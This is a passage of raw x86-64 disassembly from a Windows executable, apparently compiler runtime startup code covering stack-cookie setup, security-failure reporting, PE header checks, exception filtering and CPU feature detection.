   140006e31:	cd 29                	int    $0x29
   140006e33:	48 8d 0d 46 66 00 00 	lea    0x6646(%rip),%rcx        # 0x14000d480
   140006e3a:	e8 a9 00 00 00       	call   0x140006ee8
   140006e3f:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140006e44:	48 89 05 2d 67 00 00 	mov    %rax,0x672d(%rip)        # 0x14000d578
   140006e4b:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140006e50:	48 83 c0 08          	add    $0x8,%rax
   140006e54:	48 89 05 bd 66 00 00 	mov    %rax,0x66bd(%rip)        # 0x14000d518
   140006e5b:	48 8b 05 16 67 00 00 	mov    0x6716(%rip),%rax        # 0x14000d578
   140006e62:	48 89 05 87 65 00 00 	mov    %rax,0x6587(%rip)        # 0x14000d3f0
   140006e69:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140006e6e:	48 89 05 8b 66 00 00 	mov    %rax,0x668b(%rip)        # 0x14000d500
   140006e75:	c7 05 61 65 00 00 09 	movl   $0xc0000409,0x6561(%rip)        # 0x14000d3e0
   140006e7c:	04 00 c0 
   140006e7f:	c7 05 5b 65 00 00 01 	movl   $0x1,0x655b(%rip)        # 0x14000d3e4
   140006e86:	00 00 00 
   140006e89:	c7 05 65 65 00 00 01 	movl   $0x1,0x6565(%rip)        # 0x14000d3f8
   140006e90:	00 00 00 
   140006e93:	b8 08 00 00 00       	mov    $0x8,%eax
   140006e98:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140006e9c:	48 8d 0d 5d 65 00 00 	lea    0x655d(%rip),%rcx        # 0x14000d400
   140006ea3:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   140006eaa:	00 
   140006eab:	b8 08 00 00 00       	mov    $0x8,%eax
   140006eb0:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140006eb4:	48 8b 0d 85 61 00 00 	mov    0x6185(%rip),%rcx        # 0x14000d040
   140006ebb:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140006ec0:	b8 08 00 00 00       	mov    $0x8,%eax
   140006ec5:	48 6b c0 01          	imul   $0x1,%rax,%rax
   140006ec9:	48 8b 0d b0 61 00 00 	mov    0x61b0(%rip),%rcx        # 0x14000d080
   140006ed0:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140006ed5:	48 8d 0d 24 18 00 00 	lea    0x1824(%rip),%rcx        # 0x140008700
   140006edc:	e8 ff fe ff ff       	call   0x140006de0
   140006ee1:	90                   	nop
   140006ee2:	48 83 c4 38          	add    $0x38,%rsp
   140006ee6:	c3                   	ret
   140006ee7:	cc                   	int3
   140006ee8:	40 53                	rex push %rbx
   140006eea:	56                   	push   %rsi
   140006eeb:	57                   	push   %rdi
   140006eec:	48 83 ec 40          	sub    $0x40,%rsp
   140006ef0:	48 8b d9             	mov    %rcx,%rbx
   140006ef3:	ff 15 d7 11 00 00    	call   *0x11d7(%rip)        # 0x1400080d0
   140006ef9:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140006f00:	33 ff                	xor    %edi,%edi
   140006f02:	45 33 c0             	xor    %r8d,%r8d
   140006f05:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140006f0a:	48 8b ce             	mov    %rsi,%rcx
   140006f0d:	ff 15 b5 11 00 00    	call   *0x11b5(%rip)        # 0x1400080c8
   140006f13:	48 85 c0             	test   %rax,%rax
   140006f16:	74 3c                	je     0x140006f54
   140006f18:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140006f1d:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140006f22:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140006f29:	00 00 
   140006f2b:	4c 8b c8             	mov    %rax,%r9
   140006f2e:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140006f33:	4c 8b c6             	mov    %rsi,%r8
   140006f36:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140006f3b:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140006f40:	33 c9                	xor    %ecx,%ecx
   140006f42:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140006f47:	ff 15 73 11 00 00    	call   *0x1173(%rip)        # 0x1400080c0
   140006f4d:	ff c7                	inc    %edi
   140006f4f:	83 ff 02             	cmp    $0x2,%edi
   140006f52:	7c ae                	jl     0x140006f02
   140006f54:	48 83 c4 40          	add    $0x40,%rsp
   140006f58:	5f                   	pop    %rdi
   140006f59:	5e                   	pop    %rsi
   140006f5a:	5b                   	pop    %rbx
   140006f5b:	c3                   	ret
   140006f5c:	e9 8f 07 00 00       	jmp    0x1400076f0
   140006f61:	cc                   	int3
   140006f62:	cc                   	int3
   140006f63:	cc                   	int3
   140006f64:	48 8d 05 d5 17 00 00 	lea    0x17d5(%rip),%rax        # 0x140008740
   140006f6b:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140006f72:	00 
   140006f73:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140006f77:	48 8d 05 b2 17 00 00 	lea    0x17b2(%rip),%rax        # 0x140008730
   140006f7e:	48 89 01             	mov    %rax,(%rcx)
   140006f81:	48 8b c1             	mov    %rcx,%rax
   140006f84:	c3                   	ret
   140006f85:	cc                   	int3
   140006f86:	cc                   	int3
   140006f87:	cc                   	int3
   140006f88:	48 83 ec 48          	sub    $0x48,%rsp
   140006f8c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006f91:	e8 ce ff ff ff       	call   0x140006f64
   140006f96:	48 8d 15 6b 35 00 00 	lea    0x356b(%rip),%rdx        # 0x14000a508
   140006f9d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006fa2:	e8 25 07 00 00       	call   0x1400076cc
   140006fa7:	cc                   	int3
   140006fa8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140006fad:	55                   	push   %rbp
   140006fae:	48 8b ec             	mov    %rsp,%rbp
   140006fb1:	48 83 ec 30          	sub    $0x30,%rsp
   140006fb5:	48 8b 05 84 60 00 00 	mov    0x6084(%rip),%rax        # 0x14000d040
   140006fbc:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140006fc3:	2b 00 00 
   140006fc6:	48 3b c3             	cmp    %rbx,%rax
   140006fc9:	75 77                	jne    0x140007042
   140006fcb:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140006fcf:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   140006fd6:	00 
   140006fd7:	ff 15 a3 10 00 00    	call   *0x10a3(%rip)        # 0x140008080
   140006fdd:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140006fe1:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140006fe5:	ff 15 f5 10 00 00    	call   *0x10f5(%rip)        # 0x1400080e0
   140006feb:	8b c0                	mov    %eax,%eax
   140006fed:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140006ff1:	ff 15 91 10 00 00    	call   *0x1091(%rip)        # 0x140008088
   140006ff7:	8b c0                	mov    %eax,%eax
   140006ff9:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140006ffd:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140007001:	ff 15 89 10 00 00    	call   *0x1089(%rip)        # 0x140008090
   140007007:	8b 45 18             	mov    0x18(%rbp),%eax
   14000700a:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000700e:	48 c1 e0 20          	shl    $0x20,%rax
   140007012:	48 33 45 18          	xor    0x18(%rbp),%rax
   140007016:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   14000701a:	48 33 c1             	xor    %rcx,%rax
   14000701d:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140007024:	ff 00 00 
   140007027:	48 23 c1             	and    %rcx,%rax
   14000702a:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   140007031:	2b 00 00 
   140007034:	48 3b c3             	cmp    %rbx,%rax
   140007037:	48 0f 44 c1          	cmove  %rcx,%rax
   14000703b:	48 89 05 fe 5f 00 00 	mov    %rax,0x5ffe(%rip)        # 0x14000d040
   140007042:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140007047:	48 f7 d0             	not    %rax
   14000704a:	48 89 05 2f 60 00 00 	mov    %rax,0x602f(%rip)        # 0x14000d080
   140007051:	48 83 c4 30          	add    $0x30,%rsp
   140007055:	5d                   	pop    %rbp
   140007056:	c3                   	ret
   140007057:	cc                   	int3
   140007058:	33 c0                	xor    %eax,%eax
   14000705a:	c3                   	ret
   14000705b:	cc                   	int3
   14000705c:	b8 01 00 00 00       	mov    $0x1,%eax
   140007061:	c3                   	ret
   140007062:	cc                   	int3
   140007063:	cc                   	int3
   140007064:	b8 00 40 00 00       	mov    $0x4000,%eax
   140007069:	c3                   	ret
   14000706a:	cc                   	int3
   14000706b:	cc                   	int3
   14000706c:	48 8d 0d dd 68 00 00 	lea    0x68dd(%rip),%rcx        # 0x14000d950
   140007073:	48 ff 25 fe 0f 00 00 	rex.W jmp *0xffe(%rip)        # 0x140008078
   14000707a:	cc                   	int3
   14000707b:	cc                   	int3
   14000707c:	b0 01                	mov    $0x1,%al
   14000707e:	c3                   	ret
   14000707f:	cc                   	int3
   140007080:	48 8d 05 d9 68 00 00 	lea    0x68d9(%rip),%rax        # 0x14000d960
   140007087:	c3                   	ret
   140007088:	48 83 ec 28          	sub    $0x28,%rsp
   14000708c:	e8 7f 9f ff ff       	call   0x140001010
   140007091:	48 83 08 24          	orq    $0x24,(%rax)
   140007095:	e8 e6 ff ff ff       	call   0x140007080
   14000709a:	48 83 08 02          	orq    $0x2,(%rax)
   14000709e:	48 83 c4 28          	add    $0x28,%rsp
   1400070a2:	c3                   	ret
   1400070a3:	cc                   	int3
   1400070a4:	33 c0                	xor    %eax,%eax
   1400070a6:	39 05 e0 5f 00 00    	cmp    %eax,0x5fe0(%rip)        # 0x14000d08c
   1400070ac:	0f 94 c0             	sete   %al
   1400070af:	c3                   	ret
   1400070b0:	48 8d 05 e1 68 00 00 	lea    0x68e1(%rip),%rax        # 0x14000d998
   1400070b7:	c3                   	ret
   1400070b8:	48 8d 05 d1 68 00 00 	lea    0x68d1(%rip),%rax        # 0x14000d990
   1400070bf:	c3                   	ret
   1400070c0:	c7 05 9e 68 00 00 00 	movl   $0x0,0x689e(%rip)        # 0x14000d968
   1400070c7:	00 00 00 
   1400070ca:	c3                   	ret
   1400070cb:	cc                   	int3
   1400070cc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400070d1:	55                   	push   %rbp
   1400070d2:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   1400070d9:	ff 
   1400070da:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   1400070e1:	8b d9                	mov    %ecx,%ebx
   1400070e3:	b9 17 00 00 00       	mov    $0x17,%ecx
   1400070e8:	ff 15 aa 0f 00 00    	call   *0xfaa(%rip)        # 0x140008098
   1400070ee:	85 c0                	test   %eax,%eax
   1400070f0:	74 04                	je     0x1400070f6
   1400070f2:	8b cb                	mov    %ebx,%ecx
   1400070f4:	cd 29                	int    $0x29
   1400070f6:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400070fb:	e8 c0 ff ff ff       	call   0x1400070c0
   140007100:	33 d2                	xor    %edx,%edx
   140007102:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140007106:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   14000710c:	e8 c1 05 00 00       	call   0x1400076d2
   140007111:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140007115:	ff 15 b5 0f 00 00    	call   *0xfb5(%rip)        # 0x1400080d0
   14000711b:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   140007122:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   140007129:	48 8b cb             	mov    %rbx,%rcx
   14000712c:	45 33 c0             	xor    %r8d,%r8d
   14000712f:	ff 15 93 0f 00 00    	call   *0xf93(%rip)        # 0x1400080c8
   140007135:	48 85 c0             	test   %rax,%rax
   140007138:	74 3f                	je     0x140007179
   14000713a:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   140007141:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   140007148:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   14000714f:	00 00 
   140007151:	4c 8b c8             	mov    %rax,%r9
   140007154:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140007159:	4c 8b c3             	mov    %rbx,%r8
   14000715c:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   140007163:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140007168:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000716c:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140007171:	33 c9                	xor    %ecx,%ecx
   140007173:	ff 15 47 0f 00 00    	call   *0xf47(%rip)        # 0x1400080c0
   140007179:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140007180:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140007185:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   14000718c:	33 d2                	xor    %edx,%edx
   14000718e:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   140007195:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   14000719b:	48 83 c0 08          	add    $0x8,%rax
   14000719f:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   1400071a6:	e8 27 05 00 00       	call   0x1400076d2
   1400071ab:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1400071b2:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400071b7:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   1400071be:	40 
   1400071bf:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   1400071c6:	00 
   1400071c7:	ff 15 a3 0e 00 00    	call   *0xea3(%rip)        # 0x140008070
   1400071cd:	8b d8                	mov    %eax,%ebx
   1400071cf:	33 c9                	xor    %ecx,%ecx
   1400071d1:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400071d6:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400071db:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1400071df:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400071e4:	ff 15 c6 0e 00 00    	call   *0xec6(%rip)        # 0x1400080b0
   1400071ea:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400071ef:	ff 15 c3 0e 00 00    	call   *0xec3(%rip)        # 0x1400080b8
   1400071f5:	85 c0                	test   %eax,%eax
   1400071f7:	75 0d                	jne    0x140007206
   1400071f9:	83 fb 01             	cmp    $0x1,%ebx
   1400071fc:	74 08                	je     0x140007206
   1400071fe:	8d 48 03             	lea    0x3(%rax),%ecx
   140007201:	e8 ba fe ff ff       	call   0x1400070c0
   140007206:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   14000720d:	00 
   14000720e:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140007215:	5d                   	pop    %rbp
   140007216:	c3                   	ret
   140007217:	cc                   	int3
   140007218:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   14000721f:	33 d2                	xor    %edx,%edx
   140007221:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007226:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   14000722a:	e8 a3 04 00 00       	call   0x1400076d2
   14000722f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007234:	ff 15 2e 0e 00 00    	call   *0xe2e(%rip)        # 0x140008068
   14000723a:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   14000723f:	b8 0a 00 00 00       	mov    $0xa,%eax
   140007244:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
   14000724a:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140007251:	c3                   	ret
   140007252:	cc                   	int3
   140007253:	cc                   	int3
   140007254:	e9 ff fd ff ff       	jmp    0x140007058
   140007259:	cc                   	int3
   14000725a:	cc                   	int3
   14000725b:	cc                   	int3
   14000725c:	48 83 ec 28          	sub    $0x28,%rsp
   140007260:	33 c9                	xor    %ecx,%ecx
   140007262:	ff 15 f8 0d 00 00    	call   *0xdf8(%rip)        # 0x140008060
   140007268:	48 85 c0             	test   %rax,%rax
   14000726b:	74 3a                	je     0x1400072a7
   14000726d:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140007272:	66 39 08             	cmp    %cx,(%rax)
   140007275:	75 30                	jne    0x1400072a7
   140007277:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   14000727b:	81 3c 01 50 45 00 00 	cmpl   $0x4550,(%rcx,%rax,1)
   140007282:	75 23                	jne    0x1400072a7
   140007284:	ba 0b 02 00 00       	mov    $0x20b,%edx
   140007289:	66 39 54 01 18       	cmp    %dx,0x18(%rcx,%rax,1)
   14000728e:	75 17                	jne    0x1400072a7
   140007290:	83 bc 01 84 00 00 00 	cmpl   $0xe,0x84(%rcx,%rax,1)
   140007297:	0e 
   140007298:	76 0d                	jbe    0x1400072a7
   14000729a:	83 bc 01 f8 00 00 00 	cmpl   $0x0,0xf8(%rcx,%rax,1)
   1400072a1:	00 
   1400072a2:	0f 95 c0             	setne  %al
   1400072a5:	eb 02                	jmp    0x1400072a9
   1400072a7:	32 c0                	xor    %al,%al
   1400072a9:	48 83 c4 28          	add    $0x28,%rsp
   1400072ad:	c3                   	ret
   1400072ae:	cc                   	int3
   1400072af:	cc                   	int3
   1400072b0:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x1400072c0
   1400072b7:	48 ff 25 f2 0d 00 00 	rex.W jmp *0xdf2(%rip)        # 0x1400080b0
   1400072be:	cc                   	int3
   1400072bf:	cc                   	int3
   1400072c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400072c5:	57                   	push   %rdi
   1400072c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400072ca:	48 8b 19             	mov    (%rcx),%rbx
   1400072cd:	48 8b f9             	mov    %rcx,%rdi
   1400072d0:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   1400072d6:	75 24                	jne    0x1400072fc
   1400072d8:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   1400072dc:	75 1e                	jne    0x1400072fc
   1400072de:	8b 53 20             	mov    0x20(%rbx),%edx
   1400072e1:	81 fa 20 05 93 19    	cmp    $0x19930520,%edx
   1400072e7:	74 20                	je     0x140007309
   1400072e9:	8d 82 df fa 6c e6    	lea    -0x19930521(%rdx),%eax
   1400072ef:	83 f8 01             	cmp    $0x1,%eax
   1400072f2:	76 15                	jbe    0x140007309
   1400072f4:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   1400072fa:	74 0d                	je     0x140007309
   1400072fc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007301:	33 c0                	xor    %eax,%eax
   140007303:	48 83 c4 20          	add    $0x20,%rsp
   140007307:	5f                   	pop    %rdi
   140007308:	c3                   	ret
   140007309:	e8 d0 03 00 00       	call   0x1400076de
   14000730e:	48 89 18             	mov    %rbx,(%rax)
   140007311:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   140007315:	e8 ca 03 00 00       	call   0x1400076e4
   14000731a:	48 89 18             	mov    %rbx,(%rax)
   14000731d:	e8 c8 03 00 00       	call   0x1400076ea
   140007322:	cc                   	int3
   140007323:	cc                   	int3
   140007324:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007329:	57                   	push   %rdi
   14000732a:	48 83 ec 20          	sub    $0x20,%rsp
   14000732e:	48 8d 1d 3b 27 00 00 	lea    0x273b(%rip),%rbx        # 0x140009a70
   140007335:	48 8d 3d 34 27 00 00 	lea    0x2734(%rip),%rdi        # 0x140009a70
   14000733c:	eb 12                	jmp    0x140007350
   14000733e:	48 8b 03             	mov    (%rbx),%rax
   140007341:	48 85 c0             	test   %rax,%rax
   140007344:	74 06                	je     0x14000734c
   140007346:	ff 15 cc 12 00 00    	call   *0x12cc(%rip)        # 0x140008618
   14000734c:	48 83 c3 08          	add    $0x8,%rbx
   140007350:	48 3b df             	cmp    %rdi,%rbx
   140007353:	72 e9                	jb     0x14000733e
   140007355:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000735a:	48 83 c4 20          	add    $0x20,%rsp
   14000735e:	5f                   	pop    %rdi
   14000735f:	c3                   	ret
   140007360:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007365:	57                   	push   %rdi
   140007366:	48 83 ec 20          	sub    $0x20,%rsp
   14000736a:	48 8d 1d 0f 27 00 00 	lea    0x270f(%rip),%rbx        # 0x140009a80
   140007371:	48 8d 3d 08 27 00 00 	lea    0x2708(%rip),%rdi        # 0x140009a80
   140007378:	eb 12                	jmp    0x14000738c
   14000737a:	48 8b 03             	mov    (%rbx),%rax
   14000737d:	48 85 c0             	test   %rax,%rax
   140007380:	74 06                	je     0x140007388
   140007382:	ff 15 90 12 00 00    	call   *0x1290(%rip)        # 0x140008618
   140007388:	48 83 c3 08          	add    $0x8,%rbx
   14000738c:	48 3b df             	cmp    %rdi,%rbx
   14000738f:	72 e9                	jb     0x14000737a
   140007391:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007396:	48 83 c4 20          	add    $0x20,%rsp
   14000739a:	5f                   	pop    %rdi
   14000739b:	c3                   	ret
   14000739c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400073a1:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400073a6:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400073ab:	57                   	push   %rdi
   1400073ac:	48 83 ec 10          	sub    $0x10,%rsp
   1400073b0:	33 c0                	xor    %eax,%eax
   1400073b2:	33 c9                	xor    %ecx,%ecx
   1400073b4:	0f a2                	cpuid
   1400073b6:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   1400073bc:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   1400073c2:	0b d1                	or     %ecx,%edx
   1400073c4:	8b e8                	mov    %eax,%ebp
   1400073c6:	b8 01 00 00 00       	mov    $0x1,%eax
   1400073cb:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   1400073d1:	0b d3                	or     %ebx,%edx
   1400073d3:	8d 48 ff             	lea    -0x1(%rax),%ecx
   1400073d6:	0f a2                	cpuid
   1400073d8:	8b f9                	mov    %ecx,%edi
   1400073da:	75 5e                	jne    0x14000743a
   1400073dc:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   1400073e1:	48 c7 05 b4 5c 00 00 	movq   $0x8000,0x5cb4(%rip)        # 0x14000d0a0
   1400073e8:	00 80 00 00 
   1400073ec:	48 c7 05 b1 5c 00 00 	movq   $0xffffffffffffffff,0x5cb1(%rip)        # 0x14000d0a8
   1400073f3:	ff ff ff ff 
   1400073f7:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   1400073fc:	74 28                	je     0x140007426
   1400073fe:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140007403:	74 21                	je     0x140007426
   140007405:	3d 70 06 02 00       	cmp    $0x20670,%eax
   14000740a:	74 1a                	je     0x140007426
   14000740c:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140007411:	83 f8 20             	cmp    $0x20,%eax
   140007414:	77 24                	ja     0x14000743a
   140007416:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   14000741d:	00 00 00 
   140007420:	48 0f a3 c1          	bt     %rax,%rcx
   140007424:	73 14                	jae    0x14000743a
   140007426:	44 8b 05 43 65 00 00 	mov    0x6543(%rip),%r8d        # 0x14000d970
   14000742d:	41 83 c8 01          	or     $0x1,%r8d
   140007431:	44 89 05 38 65 00 00 	mov    %r8d,0x6538(%rip)        # 0x14000d970
   140007438:	eb 07                	jmp    0x140007441
   14000743a:	44 8b 05 2f 65 00 00 	mov    0x652f(%rip),%r8d        # 0x14000d970
   140007441:	45 33 c9             	xor    %r9d,%r9d
   140007444:	41 8b f1             	mov    %r9d,%esi
   140007447:	45 8b d1             	mov    %r9d,%r10d
   14000744a:	45 8b d9             	mov    %r9d,%r11d
   14000744d:	83 fd 07             	cmp    $0x7,%ebp
   140007450:	7c 40                	jl     0x140007492
   140007452:	41 8d 41 07          	lea    0x7(%r9),%eax
   140007456:	33 c9                	xor    %ecx,%ecx
   140007458:	0f a2                	cpuid
   14000745a:	8b f2                	mov    %edx,%esi
   14000745c:	44 8b cb             	mov    %ebx,%r9d
   14000745f:	0f ba e3 09          	bt     $0x9,%ebx
   140007463:	73 0b                	jae    0x140007470
   140007465:	41 83 c8 02          	or     $0x2,%r8d
   140007469:	44 89 05 00 65 00 00 	mov    %r8d,0x6500(%rip)        # 0x14000d970
   140007470:	83 f8 01             	cmp    $0x1,%eax
   140007473:	7c 0d                	jl     0x140007482
   140007475:	b8 07 00 00 00       	mov    $0x7,%eax
   14000747a:	8d 48 fa             	lea    -0x6(%rax),%ecx
   14000747d:	0f a2                	cpuid
   14000747f:	44 8b d2             	mov    %edx,%r10d
   140007482:	b8 24 00 00 00       	mov    $0x24,%eax
   140007487:	3b e8                	cmp    %eax,%ebp
   140007489:	7c 07                	jl     0x140007492
   14000748b:	33 c9                	xor    %ecx,%ecx
   14000748d:	0f a2                	cpuid
   14000748f:	44 8b db             	mov    %ebx,%r11d
   140007492:	48 8b 05 f7 5b 00 00 	mov    0x5bf7(%rip),%rax        # 0x14000d090
   140007499:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   14000749d:	c7 05 f1 5b 00 00 01 	movl   $0x1,0x5bf1(%rip)        # 0x14000d098
   1400074a4:	00 00 00 
   1400074a7:	c7 05 eb 5b 00 00 02 	movl   $0x2,0x5beb(%rip)        # 0x14000d09c
   1400074ae:	00 00 00 
   1400074b1:	48 89 05 d8 5b 00 00 	mov    %rax,0x5bd8(%rip)        # 0x14000d090
   1400074b8:	0f ba e7 14          	bt     $0x14,%edi
   1400074bc:	73 1f                	jae    0x1400074dd
   1400074be:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   1400074c2:	c7 05 cc 5b 00 00 02 	movl   $0x2,0x5bcc(%rip)        # 0x14000d098
   1400074c9:	00 00 00 
   1400074cc:	48 89 05 bd 5b 00 00 	mov    %rax,0x5bbd(%rip)        # 0x14000d090
   1400074d3:	c7 05 bf 5b 00 00 06 	movl   $0x6,0x5bbf(%rip)        # 0x14000d09c
   1400074da:	00 00 00 
   1400074dd:	0f ba e7 1b          	bt     $0x1b,%edi
   1400074e1:	0f 83 33 01 00 00    	jae    0x14000761a
   1400074e7:	33 c9                	xor    %ecx,%ecx
   1400074e9:	0f 01 d0             	xgetbv
   1400074ec:	48 c1 e2 20          	shl    $0x20,%rdx
   1400074f0:	48 0b d0             	or     %rax,%rdx
   1400074f3:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400074f8:	0f ba e7 1c          	bt     $0x1c,%edi
   1400074fc:	0f 83 fc 00 00 00    	jae    0x1400075fe
   140007502:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140007507:	24 06                	and    $0x6,%al
   140007509:	3c 06                	cmp    $0x6,%al
   14000750b:	0f 85 ed 00 00 00    	jne    0x1400075fe
   140007511:	8b 05 85 5b 00 00    	mov    0x5b85(%rip),%eax        # 0x14000d09c
   140007517:	b2 e0                	mov    $0xe0,%dl
   140007519:	83 c8 08             	or     $0x8,%eax
   14000751c:	c7 05 72 5b 00 00 03 	movl   $0x3,0x5b72(%rip)        # 0x14000d098
   140007523:	00 00 00 
   140007526:	89 05 70 5b 00 00    	mov    %eax,0x5b70(%rip)        # 0x14000d09c
   14000752c:	41 f6 c1 20          	test   $0x20,%r9b
   140007530:	74 62                	je     0x140007594
   140007532:	83 c8 20             	or     $0x20,%eax
   140007535:	c7 05 59 5b 00 00 05 	movl   $0x5,0x5b59(%rip)        # 0x14000d098
   14000753c:	00 00 00 
   14000753f:	89 05 57 5b 00 00    	mov    %eax,0x5b57(%rip)        # 0x14000d09c
   140007545:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   14000754a:	48 8b 05 3f 5b 00 00 	mov    0x5b3f(%rip),%rax        # 0x14000d090
   140007551:	44 23 c9             	and    %ecx,%r9d
   140007554:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   140007558:	48 89 05 31 5b 00 00 	mov    %rax,0x5b31(%rip)        # 0x14000d090
   14000755f:	44 3b c9             	cmp    %ecx,%r9d
   140007562:	75 37                	jne    0x14000759b
   140007564:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140007569:	22 c2                	and    %dl,%al
   14000756b:	3a c2                	cmp    %dl,%al
   14000756d:	75 25                	jne    0x140007594
   14000756f:	48 8b 05 1a 5b 00 00 	mov    0x5b1a(%rip),%rax        # 0x14000d090
   140007576:	83 0d 1f 5b 00 00 40 	orl    $0x40,0x5b1f(%rip)        # 0x14000d09c
   14000757d:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   140007581:	c7 05 0d 5b 00 00 06 	movl   $0x6,0x5b0d(%rip)        # 0x14000d098
   140007588:	00 00 00 
   14000758b:	48 89 05 fe 5a 00 00 	mov    %rax,0x5afe(%rip)        # 0x14000d090
   140007592:	eb 07                	jmp    0x14000759b
